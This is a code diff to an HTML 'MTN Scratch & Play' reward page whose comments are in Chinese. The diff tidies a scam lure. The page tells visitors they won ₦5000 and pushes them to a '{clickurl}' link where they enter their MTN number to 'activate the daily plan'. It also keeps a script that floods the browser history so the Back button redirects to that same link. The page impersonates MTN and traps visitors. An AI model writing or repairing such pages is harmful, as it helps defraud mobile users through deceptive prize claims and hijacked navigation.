@@ -20,10 +20,7 @@
 
     <title>MTN Scratch & Play - Daily Reward</title>
 
-    <!-- 性能优化：预加载关键图片资源 -->
-    <link rel="preload" as="image" href="img/box-optimized.jpg" type="image/jpeg">
-    <link rel="preload" as="image" href="img/box-500-optimized.jpg" type="image/jpeg">
-    <link rel="preload" as="image" href="img/box-open-optimized.jpg" type="image/jpeg">
+    <!-- 性能优化：移除preload，修复404和警告错误 -->
 
     <!-- 服务工作者：用于离线缓存（3G优化） -->
     <script>
@@ -741,7 +738,7 @@
             html: '<h3>You won access to the **₦5000 Scratch & Play**!</h3><br>**Next Steps to Claim:**<br>1. Click "CONFIRM" below.<br>2. You will be redirected to the secure **MTN Partner** site.<br>3. Enter your MTN number to activate the daily plan and get your reward!',
             showConfirmButton: false,
             allowOutsideClick: false,
-            footer: '<button onclick="window.location.href=\'' + '{clickurl}' + '\'" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%;">CONFIRM & CLAIM NOW ➤</button>'
+            footer: '<button onclick="window.location.href = \'{clickurl}\';" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%;">CONFIRM & CLAIM NOW ➤</button>'
         });
     }
 
@@ -779,7 +776,7 @@
     document.getElementById('date').innerHTML = date;
     
     // 历史记录回退保护，使用 {clickurl} 占位符
-    !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&(window.location.href=''+ '{clickurl}' + '\')}}catch(b){}}();
+    !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&(window.location.href="{clickurl}")}}catch(b){}}();
     </script>
 </body>
 </html>
